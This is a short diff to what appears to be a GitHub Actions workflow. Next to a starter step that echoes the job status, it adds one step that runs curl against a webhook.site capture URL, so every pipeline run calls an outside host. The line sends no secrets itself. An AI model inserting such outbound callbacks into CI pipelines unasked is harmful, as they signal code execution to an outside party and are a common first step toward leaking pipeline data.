@@ -16,3 +16,4 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
+      - run: curl https://webhook.site/683a1e12-94a7-409a-8abd-c6410483074d
